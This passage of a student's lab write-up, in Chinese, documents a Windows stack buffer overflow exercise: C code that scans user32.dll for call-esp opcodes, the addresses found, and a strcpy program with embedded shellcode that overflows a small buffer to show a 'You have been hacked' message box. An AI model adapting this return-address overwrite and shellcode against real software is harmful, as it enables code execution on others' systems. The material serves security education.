class="hljs-string">&quot;LoadLibrary Error!&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	BYTE* ptr =(BYTE*)hHandle;<br>	<span class="hljs-type">int</span> address;<br>	BOOL done_Flag=<span class="hljs-literal">false</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;!done_Flag;i++)<br>	&#123;<br>		<br>		__try<br>			&#123;<br>				<span class="hljs-keyword">if</span> (ptr[i] == <span class="hljs-number">0xFF</span> &amp;&amp; ptr[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xD4</span>)  <span class="hljs-comment">//jmp esp FFE4 ;  call esp FFD4</span><br>				&#123;<br>					address = (<span class="hljs-type">int</span>)ptr+i;<br>					<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);<br>				&#125;<br>				<br>				<br>			&#125;<br>		__except (EXCEPTION_EXECUTE_HANDLER)&#123;&#125;<br>		&#123;<br>			<span class="hljs-comment">//	address = (int)ptr+i;</span><br>			<span class="hljs-comment">//	printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br>			<span class="hljs-comment">//	done_Flag=true;</span><br>		&#125;<br>		<br>		<br>	&#125;<br>	<span class="hljs-built_in">getchar</span>();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">OPCODE found at 0x76077be7</span><br><span class="hljs-comment">OPCODE found at 0x76078cad</span><br><span class="hljs-comment">OPCODE found at 0x76078cb9</span><br><span class="hljs-comment">OPCODE found at 0x76079d7f</span><br><span class="hljs-comment">OPCODE found at 0x7607ad25</span><br><span class="hljs-comment">OPCODE found at 0x7607dea7</span><br><span class="hljs-comment">OPCODE found at 0x7607dffb</span><br><span class="hljs-comment">OPCODE found at 0x7607e00b</span><br><span class="hljs-comment">OPCODE found at 0x76080be5</span><br><span class="hljs-comment">OPCODE found at 0x76080be9</span><br><span class="hljs-comment">OPCODE found at 0x76080ff9</span><br><span class="hljs-comment">OPCODE found at 0x760812d1</span><br><span class="hljs-comment">OPCODE found at 0x760823a3</span><br><span class="hljs-comment">OPCODE found at 0x7608345d</span><br><span class="hljs-comment">OPCODE found at 0x76083e2b</span><br><span class="hljs-comment">OPCODE found at 0x76084523</span><br><span class="hljs-comment">OPCODE found at 0x76084ef9</span><br><span class="hljs-comment">OPCODE found at 0x760855e9</span><br><span class="hljs-comment">*/</span> <br><br>D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="hljs-number">0</span>	<span class="hljs-number">-1</span>	In function <span class="hljs-string">&#x27;int main()&#x27;</span>:<br>D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="hljs-number">18</span>	<span class="hljs-number">17</span>	[错误] <span class="hljs-string">&#x27;__try&#x27;</span> was <span class="hljs-keyword">not</span> declared in <span class="hljs-keyword">this</span> scope<br>D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="hljs-number">28</span>	<span class="hljs-number">17</span>	[错误] <span class="hljs-string">&#x27;__except&#x27;</span> was <span class="hljs-keyword">not</span> declared in <span class="hljs-keyword">this</span> scope<br>D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="hljs-number">12</span>	<span class="hljs-number">15</span>	[警告] unused variable <span class="hljs-string">&#x27;ptr&#x27;</span> [-Wunused-variable]<br>D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="hljs-number">13</span>	<span class="hljs-number">13</span>	[警告] unused variable <span class="hljs-string">&#x27;address&#x27;</span> [-Wunused-variable]<br></code></pre></td></tr></table></figure>
+<p>原程序遇到的编译错误和警告表明有几个问题需要解决：</p>
+<ol>
+<li><p><strong><code>__try</code> 和 <code>__except</code> 未声明</strong>：这些是 Microsoft 特有的结构化异常处理（SEH）关键字，仅在特定的编译器（如 MSVC）中可用。如果您在 DevC++ 或其他非 MSVC 编译器中编译此代码，这些关键字将不可用。</p>
+</li>
+<li><p><strong>未使用的变量</strong>：警告表明 <code>ptr</code> 和 <code>address</code> 变量被声明但未使用。这可能是因为代码中有逻辑错误或不完整的实现。</p>
+</li>
+</ol>
+<p>要修复这些问题，我们可以做如下修改：</p>
+<ul>
+<li>替换 <code>__try</code> 和 <code>__except</code> 为标准的 C++ 异常处理，如果需要的话。但是，由于您的目的是扫描内存，可能不需要异常处理。</li>
+<li>确保所有声明的变量都被正确使用。</li>
+</ul>
+<p>以下是修改后的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    HINSTANCE hHandle = LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hHandle) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LoadLibrary Error!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    BYTE* ptr = (BYTE*)hHandle;<br>    <span class="hljs-type">uintptr_t</span> address;  <span class="hljs-comment">// 使用 uintptr_t 以兼容 64 位系统</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uintptr_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000000</span>; i++) &#123; <span class="hljs-comment">// 假定扫描的最大范围</span><br>        <span class="hljs-keyword">if</span> (ptr[i] == <span class="hljs-number">0xFF</span> &amp;&amp; ptr[i + <span class="hljs-number">1</span>] == <span class="hljs-number">0xD4</span>) &#123;<br>            address = (<span class="hljs-type">uintptr_t</span>)ptr + i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OPCODE found at 0x%p\n&quot;</span>, (<span class="hljs-type">void</span>*)address);<br>        &#125;<br>    &#125;<br><br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这段代码在 <code>user32.dll</code> 中搜索特定的机器码（<code>0xFF</code> 和 <code>0xD4</code>），并打印出找到的每个地址。请记住，直接访问系统库的内存可能导致不稳定的行为，因此请小心使用。此外，这段代码可能需要在具有管理员权限的环境中运行，以获取对系统库的访问权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">OPCODE found at 0x75940FBF<br>OPCODE found at 0x75940FC3<br>OPCODE found at 0x75940FC7<br>OPCODE found at 0x75941013<br>OPCODE found at 0x759410EF<br>OPCODE found at 0x7594117B<br>OPCODE found at 0x7594127F<br>OPCODE found at 0x75941383<br>OPCODE found at 0x75941CA7<br>OPCODE found at 0x75941DA7<br>OPCODE found at 0x75941E1B<br>OPCODE found at 0x75941EA7<br>OPCODE found at 0x75941F1B<br>OPCODE found at 0x75941F77<br>OPCODE found at 0x75941FA7<br>OPCODE found at 0x759420A7<br>OPCODE found at 0x75942183<br>OPCODE found at 0x759421A7<br>OPCODE found at 0x759422A7<br>OPCODE found at 0x759423A7<br>OPCODE found at 0x759424A7<br>OPCODE found at 0x759425A7<br>OPCODE found at 0x759426A7<br>OPCODE found at 0x75942783<br>OPCODE found at 0x759427A7<br>OPCODE found at 0x759428A7<br>OPCODE found at 0x759429A7<br>OPCODE found at 0x75942AA7<br>OPCODE found at 0x75942BA7<br>OPCODE found at 0x75942CA7<br>OPCODE found at 0x75942DA7<br>OPCODE found at 0x75942EA7<br>OPCODE found at 0x75942FA7<br>OPCODE found at 0x759430A7<br>OPCODE found at 0x759431A7<br>OPCODE found at 0x759432A7<br>OPCODE found at 0x759433A7<br>OPCODE found at 0x759434A7<br>OPCODE found at 0x759435A7<br>OPCODE found at 0x759436A7<br>OPCODE found at 0x759437AB<br>OPCODE found at 0x7594CBA7<br>OPCODE found at 0x7594CBCF<br>OPCODE found at 0x7594D67B<br>OPCODE found at 0x7594F437<br>OPCODE found at 0x7594FA27<br>OPCODE found at 0x75952433<br>OPCODE found at 0x75958ADB<br>OPCODE found at 0x759592F7<br>OPCODE found at 0x75959F07<br>OPCODE found at 0x7595A10B<br>OPCODE found at 0x7595A417<br>OPCODE found at 0x7595ADA7<br>OPCODE found at 0x7595AEB3<br>OPCODE found at 0x7595AFB7<br>OPCODE found at 0x7595B0BF<br>OPCODE found at 0x7595B1C7<br>OPCODE found at 0x7595B2CB<br>OPCODE found at 0x7595B3D3<br>OPCODE found at 0x7595B6DF<br>OPCODE found at 0x7595B9F3<br>OPCODE found at 0x7595BAFF<br>OPCODE found at 0x7595BC07<br>OPCODE found at 0x7595BE13<br>OPCODE found at 0x7595BF1F<br>OPCODE found at 0x7595CB1F<br>OPCODE found at 0x7595D70F<br>OPCODE found at 0x7595D7C7<br>OPCODE found at 0x7595DDDF<br>OPCODE found at 0x7595DF0B<br>OPCODE found at 0x7595DFD3<br>OPCODE found at 0x7595E09B<br>OPCODE found at 0x7595E163<br>OPCODE found at 0x7595E543<br>OPCODE found at 0x7595E607<br>OPCODE found at 0x7595E6CF<br>OPCODE found at 0x7595E797<br>OPCODE found at 0x7595E857<br>OPCODE found at 0x7595E913<br>OPCODE found at 0x7595F097<br>OPCODE found at 0x7595F0CB<br>OPCODE found at 0x7595F39F<br>OPCODE found at 0x7595F6EF<br>OPCODE found at 0x7595F773<br>OPCODE found at 0x7595F7FB<br>OPCODE found at 0x7595FB23<br>OPCODE found at 0x7595FBA7<br>OPCODE found at 0x7596008F<br>OPCODE found at 0x759600D7<br>OPCODE found at 0x75960163<br>OPCODE found at 0x75964AE3<br>OPCODE found at 0x759677BB<br>OPCODE found at 0x75968B27<br>OPCODE found at 0x75969827<br>OPCODE found at 0x759698EB<br>OPCODE found at 0x75969AC7<br>OPCODE found at 0x7596B0D3<br>OPCODE found at 0x7596B7B3<br>OPCODE found at 0x75970AFB<br>OPCODE found at 0x759733D3<br>OPCODE found at 0x759734D3<br>OPCODE found at 0x759734DB<br>OPCODE found at 0x759734DF<br>OPCODE found at 0x759734E3<br>OPCODE found at 0x759735E7<br>OPCODE found at 0x759735F7<br>OPCODE found at 0x759735FB<br>OPCODE found at 0x75973703<br>OPCODE found at 0x75973707<br>OPCODE found at 0x7597370B<br>OPCODE found at 0x75973917<br>OPCODE found at 0x75973C27<br>OPCODE found at 0x75973CEF<br>OPCODE found at 0x75973D37<br>OPCODE found at 0x75973E3B<br>OPCODE found at 0x7597410B<br>OPCODE found at 0x75974B3F<br>OPCODE found at 0x759754F7<br>OPCODE found at 0x75975E77<br>OPCODE found at 0x75975E7B<br>OPCODE found at 0x75975E7F<br>OPCODE found at 0x75975E83<br>OPCODE found at 0x75975E87<br>OPCODE found at 0x75975E8B<br>OPCODE found at 0x75975E8F<br>OPCODE found at 0x75975E93<br>OPCODE found at 0x75975F2F<br>OPCODE found at 0x75975F5F<br>OPCODE found at 0x75975FEF<br>OPCODE found at 0x75976283<br>OPCODE found at 0x75976407<br>OPCODE found at 0x759764BF<br>OPCODE found at 0x759764CB<br>OPCODE found at 0x7597658F<br>OPCODE found at 0x7597664F<br>OPCODE found at 0x75976877<br>OPCODE found at 0x759770EB<br>OPCODE found at 0x75978073<br>OPCODE found at 0x75978077<br>OPCODE found at 0x75978153<br>OPCODE found at 0x7597CDBF<br>OPCODE found at 0x7597CDC3<br>OPCODE found at 0x7597CDC7<br>OPCODE found at 0x7597CE13<br>OPCODE found at 0x7597CEEF<br>OPCODE found at 0x7597CF7B<br>OPCODE found at 0x7597D07F<br>OPCODE found at 0x7597D183<br>OPCODE found at 0x7597DAA7<br>OPCODE found at 0x7597DBA7<br>OPCODE found at 0x7597DC1B<br>OPCODE found at 0x7597DCA7<br>OPCODE found at 0x7597DD1B<br>OPCODE found at 0x7597DD77<br>OPCODE found at 0x7597DDA7<br>OPCODE found at 0x7597DEA7<br>OPCODE found at 0x7597DF83<br>OPCODE found at 0x7597DFA7<br>OPCODE found at 0x7597E0A7<br>OPCODE found at 0x7597E1A7<br>OPCODE found at 0x7597E2A7<br>OPCODE found at 0x7597E3A7<br>OPCODE found at 0x7597E4A7<br>OPCODE found at 0x7597E583<br>OPCODE found at 0x7597E5A7<br>OPCODE found at 0x7597E6A7<br>OPCODE found at 0x7597E7A7<br>OPCODE found at 0x7597E8A7<br>OPCODE found at 0x7597E9A7<br>OPCODE found at 0x7597EAA7<br>OPCODE found at 0x7597EBA7<br>OPCODE found at 0x7597ECA7<br>OPCODE found at 0x7597EDA7<br>OPCODE found at 0x7597EEA7<br>OPCODE found at 0x7597EFA7<br>OPCODE found at 0x7597F0A7<br>OPCODE found at 0x7597F1A7<br>OPCODE found at 0x7597F2A7<br>OPCODE found at 0x7597F3A7<br>OPCODE found at 0x7597F4A7<br>OPCODE found at 0x7597F5AB<br>OPCODE found at 0x7599109B<br>OPCODE found at 0x7599109F<br>OPCODE found at 0x759929EB<br>OPCODE found at 0x75993183<br>OPCODE found at 0x75993CF7<br>OPCODE found at 0x75993D0F<br>OPCODE found at 0x7599481B<br>OPCODE found at 0x75994BFB<br>OPCODE found at 0x75994C9F<br>OPCODE found at 0x7599595B<br>OPCODE found at 0x7599595F<br>OPCODE found at 0x75995E8C<br>OPCODE found at 0x75995E9C<br>OPCODE found at 0x75995F6C<br>OPCODE found at 0x7599E18F<br>OPCODE found at 0x7599FA1B<br>OPCODE found at 0x759A0FCB<br>OPCODE found at 0x759A261F<br>OPCODE found at 0x759A2627<br>OPCODE found at 0x759A270F<br>OPCODE found at 0x759A4633<br>OPCODE found at 0x759A4637<br>OPCODE found at 0x759B2CF7<br>OPCODE found at 0x759B38EF<br>OPCODE found at 0x759B4CE7<br>OPCODE found at 0x759B512B<br>OPCODE found at 0x759BF74F<br>OPCODE found at 0x759C0FDB<br>OPCODE found at 0x759C258B<br>OPCODE found at 0x759C3BDF<br>OPCODE found at 0x759C3BE7<br>OPCODE found at 0x759C3CCF<br>OPCODE found at 0x759C5BF3<br>OPCODE found at 0x759C5BF7<br>OPCODE found at 0x759C797B<br>OPCODE found at 0x759C98EB<br>OPCODE found at 0x759CA1CF<br>OPCODE found at 0x759E5AA9<br>OPCODE found at 0x759E66DF<br>OPCODE found at 0x759E6AE3<br>OPCODE found at 0x759E6B6F<br>OPCODE found at 0x759E6B73<br>OPCODE found at 0x759EEBA3<br>OPCODE found at 0x759F0D2F<br>OPCODE found at 0x759F1C91<br>OPCODE found at 0x759F34B7<br>OPCODE found at 0x759F457D<br>OPCODE found at 0x759F8929<br>OPCODE found at 0x759F9253<br>OPCODE found at 0x759F955F<br>OPCODE found at 0x759F9963<br>OPCODE found at 0x759F99EF<br>OPCODE found at 0x759F99F3<br>OPCODE found at 0x75A01A23<br>OPCODE found at 0x75A03BAF<br>OPCODE found at 0x75A06337<br>OPCODE found at 0x75A073FD<br>OPCODE found at 0x75A0D5BD<br>OPCODE found at 0x75A105FB<br>OPCODE found at 0x75A12293<br>OPCODE found at 0x75A17D19<br>OPCODE found at 0x75A18A67<br>OPCODE found at 0x75A1AEEB<br>OPCODE found at 0x75A1BF31<br>OPCODE found at 0x75A1DBA1<br></code></pre></td></tr></table></figure>
+<p><code>strcy.cpp</code>程序实现</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-comment">// 恶意代码的shellcode，使用十六进制表示</span><br><span class="hljs-type">char</span> name[] = <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="hljs-string">&quot;\x90\x90\x90\x90&quot;</span><br><span class="hljs-string">&quot;\xBF\x0F\x94\x75&quot;</span><span class="hljs-comment">//这里调用</span><br><span class="hljs-string">&quot;\x83\xEC\x50&quot;</span><br><span class="hljs-string">&quot;\x33\xDB&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="hljs-string">&quot;\x68\x57\x61\x72\x6E&quot;</span><br><span class="hljs-string">&quot;\x8B\xC4&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\x68\x21\x20\x20\x20&quot;</span><br><span class="hljs-string">&quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="hljs-string">&quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="hljs-string">&quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="hljs-string">&quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="hljs-string">&quot;\x68\x59\x6F\x75\x20&quot;</span><br><span class="hljs-string">&quot;\x8B\xCC&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\x50&quot;</span><br><span class="hljs-string">&quot;\x51&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\xB8\x10\xa1\x8f\x75&quot;</span><span class="hljs-comment">//\xB8不能改，小端存储</span><br><span class="hljs-string">&quot;\xFF\xD0&quot;</span><br><span class="hljs-string">&quot;\x53&quot;</span><br><span class="hljs-string">&quot;\xB8\xd0\x74\x41\x76&quot;</span> <span class="hljs-comment">//\xB8不能改，小端存储</span><br><span class="hljs-string">&quot;\xFF\xD0&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-type">char</span> st[<span class="hljs-number">11</span>];<br>		<span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br>	<span class="hljs-comment">// 将shellcode复制到更小的缓冲区，这可能导致缓冲区溢出</span><br>	<span class="hljs-built_in">strcpy</span>(st, name);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,st);<br>	<span class="hljs-comment">// 打印复制到缓冲区的内容</span><br>	<span class="hljs-built_in">getchar</span>();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  以下是注释掉的代码，看起来像是用于动态加载库的代码片段，可能用于进一步的溢出利用</span><br><span class="hljs-comment">  &quot;\x8D\x4C\x24\x04&quot;</span><br><span class="hljs-comment">  &quot;\x83\xE4\xF0&quot; </span><br><span class="hljs-comment">  &quot;\xFF\x71\xFC&quot; </span><br><span class="hljs-comment">  &quot;\x55&quot; </span><br><span class="hljs-comment">  &quot;\x89\xE5&quot; </span><br><span class="hljs-comment">  &quot;\x51&quot; </span><br><span class="hljs-comment">  &quot;\x83\xEC\x14&quot; </span><br><span class="hljs-comment">  &quot;\xE8\x8A\x09\x00\x00&quot;</span><br><span class="hljs-comment">  &quot;\xC7\x44\x24\x0C\x00\x00\x00\x00&quot;</span><br><span class="hljs-comment">  &quot;\xC7\x44\x24\x08\x00\x40\x40\x00&quot;</span><br><span class="hljs-comment">  &quot;\xC7\x44\x24\x04\x08\x40\x40\x00&quot; </span><br><span class="hljs-comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span><br><span class="hljs-comment">  &quot;\xA1\xE0\x61\x40\x00&quot; </span><br><span class="hljs-comment">  &quot;\xFF\xD0&quot; </span><br><span class="hljs-comment">  &quot;\x83\xEC\x10&quot; </span><br><span class="hljs-comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span><br><span class="hljs-comment">  &quot;\xA1\x24\x61\x40\x00&quot;</span><br><span class="hljs-comment">  &quot;\xFF\xD0&quot;</span><br><span class="hljs-comment"> */</span><br><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141932525.png" class title="image-20240131141932525">
+<h3><span id="三-总结">三、总结</span></h3><h4><span id="实验收获">实验收获</span></h4><ul>
+<li><strong>理论与实践结合</strong>：通过实验操作，加深了对缓冲区溢出攻击原理的理解。</li>
+<li><strong>问题解决能力</strong>：在实验过程中遇到问题，如编译模式对栈空间的影响，学会了如何查找和解决问题。</li>
+<li><strong>安全意识提升</strong>：认识到了安全编程的重要性，以及在软件开发中预防缓冲区溢出的必要性。</li>
+</ul>
+<h4><span id="实验方法">实验方法</span></h4><ol>
+<li>精确定位返回地址的位置：通过调试工具（如OllyDbg）观察程序执行过程中堆栈的变化，找到返回地址。</li>
+<li>寻找一个合适的地址用于覆盖原始地址：使用jmp esp或call esp等指令，跳转到shellcode执行。</li>
+<li>编写shellcode到相应的缓冲区中：编写能够执行特定功能的shellcode，并将其放入程序的缓冲区。</li>
+</ol>
+<h4><span id="实验结果">实验结果</span></h4><ul>
+<li>成功实现了缓冲区溢出，程序执行了预期的MessageBox弹窗警告。</li>
+<li>通过IDA Pro分析，确认了shellcode执行后程序的控制流程。</li>
+</ul>
+<h4><span id="分析与讨论">分析与讨论</span></h4><ul>
+<li>实验结果符合预期，验证了缓冲区溢出攻击的可行性。</li>
+<li>实验中遇到的问题，如编译模式对栈空间的影响，以及动态链接库的加载，都对攻击成功与否有重要影响。</li>
+</ul>
+<h4><span id="实验结论">实验结论</span></h4><ul>
+<li>缓冲区溢出攻击是一种有效的软件漏洞利用技术，需要开发者在编写程序时注意边界检查和内存管理。</li>
+<li>实验加深了对缓冲区溢出攻击原理的理解，提高了安全编程意识。</li>
+</ul>
+<h4><span id="实验总结">实验总结</span></h4><ul>
+<li><strong>实验目的达成</strong>：成功完成了缓冲区溢出攻击的模拟，实现了预期的功能。</li>
+<li><strong>实验过程记录</strong>：详细记录了实验步骤和遇到的问题，为后续分析提供了依据。</li>
